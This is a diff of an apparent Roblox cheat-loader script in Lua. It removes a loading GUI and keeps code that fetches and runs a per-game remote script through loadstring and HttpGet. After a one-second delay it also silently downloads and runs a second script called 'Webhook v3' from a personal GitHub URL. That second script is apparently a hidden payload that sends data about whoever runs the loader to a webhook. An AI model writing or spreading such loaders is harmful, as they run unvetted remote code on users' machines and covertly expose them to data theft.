@@ -1,96 +1,8 @@
-_G.LoadingDone = true
-
 -- Tunggu game siap
 repeat task.wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character
 if not game:IsLoaded() then game.Loaded:Wait() end
 
-local player = game.Players.LocalPlayer
 local placeId = game.PlaceId
-
-------------------------------------------------------
--- GUI LOADER PREMIUM (GLASS + GLOW + SMOOTH)
-------------------------------------------------------
-
-local TweenService = game:GetService("TweenService")
-local function tween(obj, t, data)
-    TweenService:Create(obj, TweenInfo.new(t, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), data):Play()
-end
-
-local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Name = "LoaderUI"
-
--- BLUR BACKGROUND
-local blur = Instance.new("BlurEffect", game.Lighting)
-blur.Size = 0
-tween(blur, 0.7, {Size = 12})
-
-local Bg = Instance.new("Frame", ScreenGui)
-Bg.Size = UDim2.new(1, 0, 1, 0)
-Bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Bg.BackgroundTransparency = 1
-
--- FRAME (GLASSMORPHISM)
-local Frame = Instance.new("Frame", ScreenGui)
-Frame.Size = UDim2.new(0, 380, 0, 150)
-Frame.Position = UDim2.new(0.5, -190, 0.7, -80)
-Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Frame.BackgroundTransparency = 0.35
-Frame.BorderSizePixel = 0
-Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)
-
--- OUTLINE
-local Stroke = Instance.new("UIStroke", Frame)
-Stroke.Color = Color3.fromRGB(70, 150, 255)
-Stroke.Thickness = 1.5
-Stroke.Transparency = 0.35
-
--- GLOW EFFECT
-local Glow = Instance.new("ImageLabel", Frame)
-Glow.Size = UDim2.new(1, 40, 1, 40)
-Glow.Position = UDim2.new(0.5, -20, 0.5, -20)
-Glow.Image = "rbxassetid://4997411855"
-Glow.ImageColor3 = Color3.fromRGB(0, 150, 255)
-Glow.ImageTransparency = 0.8
-Glow.BackgroundTransparency = 1
-
--- TITLE
-local Title = Instance.new("TextLabel", Frame)
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.Position = UDim2.new(0, 0, 0, 8)
-Title.BackgroundTransparency = 1
-Title.Font = Enum.Font.GothamBlack
-Title.TextSize = 22
-Title.TextColor3 = Color3.fromRGB(220, 230, 255)
-Title.TextTransparency = 1
-Title.Text = "Loading Script..."
-
--- GAME INFO
-local GameInfo = Instance.new("TextLabel", Frame)
-GameInfo.Size = UDim2.new(1, -20, 0, 24)
-GameInfo.Position = UDim2.new(0, 10, 0, 48)
-GameInfo.BackgroundTransparency = 1
-GameInfo.Font = Enum.Font.GothamMedium
-GameInfo.TextSize = 16
-GameInfo.TextColor3 = Color3.fromRGB(180, 180, 180)
-GameInfo.TextTransparency = 1
-GameInfo.Text = ""
-
--- PROGRESS BAR BACKGROUND
-local PBack = Instance.new("Frame", Frame)
-PBack.Size = UDim2.new(1, -40, 0, 8)
-PBack.Position = UDim2.new(0, 20, 1, -30)
-PBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-PBack.BackgroundTransparency = 0.45
-Instance.new("UICorner", PBack).CornerRadius = UDim.new(0, 6)
-
--- PROGRESS BAR FILL
-local ProgressBar = Instance.new("Frame", PBack)
-ProgressBar.Size = UDim2.new(0, 0, 1, 0)
-ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-ProgressBar.BackgroundTransparency = 0
-Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(0, 6)
 
 ------------------------------------------------------
 -- DATA GAME
@@ -131,69 +43,21 @@ for name, info in pairs(games) do
 end
 
 ------------------------------------------------------
--- SET GAME INFO + GUI FADE IN
-------------------------------------------------------
-
-GameInfo.Text = "Detected Game: " .. gameName
-tween(GameInfo, 0.6, {TextTransparency = 0})
-
-tween(Bg, 0.7, {BackgroundTransparency = 0.4})
-tween(Frame, 0.7, {BackgroundTransparency = 0.15})
-tween(Stroke, 0.7, {Transparency = 0})
-tween(Glow, 1.1, {ImageTransparency = 0.45})
-tween(Title, 0.7, {TextTransparency = 0})
-tween(PBack, 0.7, {BackgroundTransparency = 0.25})
-
-task.wait(0.6)
-
-------------------------------------------------------
--- PROGRESS BAR ANIMATION
-------------------------------------------------------
-
-for i = 1, 100 do
-    tween(ProgressBar, 0.12, {Size = UDim2.new(i/100, 0, 1, 0)})
-    Glow.ImageTransparency = 0.45 - (i / 250)
-    Title.Text = "Loading... " .. i .. "%"
-    task.wait(0.02)
-end
-
-Title.Text = "Loading Complete"
-task.wait(0.4)
-
-------------------------------------------------------
--- GUI FADE OUT (SUPER SMOOTH)
-------------------------------------------------------
-
-tween(Bg, 0.5, {BackgroundTransparency = 1})
-tween(Frame, 0.5, {BackgroundTransparency = 1})
-tween(Stroke, 0.5, {Transparency = 1})
-tween(Glow, 0.5, {ImageTransparency = 1})
-tween(Title, 0.5, {TextTransparency = 1})
-tween(GameInfo, 0.5, {TextTransparency = 1})
-tween(PBack, 0.5, {BackgroundTransparency = 1})
-tween(ProgressBar, 0.5, {BackgroundTransparency = 1})
-tween(blur, 0.5, {Size = 0})
-
-task.wait(0.6)
-blur:Destroy()
-ScreenGui:Destroy()
-
-------------------------------------------------------
 -- EXECUTE SCRIPT
 ------------------------------------------------------
 
 if scriptUrl then
-    print("Executing script for:", gameName)
-
+    print("Loading script for:", gameName)
+    
     pcall(function()
         loadstring(game:HttpGet(scriptUrl))()
     end)
-
+    
     task.delay(1, function()
         pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/hdgsydgdgdy1233/Loaderlua/refs/heads/main/Webhook%20v3"))()
         end)
     end)
 else
-    warn("Unsupported game. PlaceId:", placeId)
+    game.Players.LocalPlayer:Kick("❌ Game tidak didukung")
 end
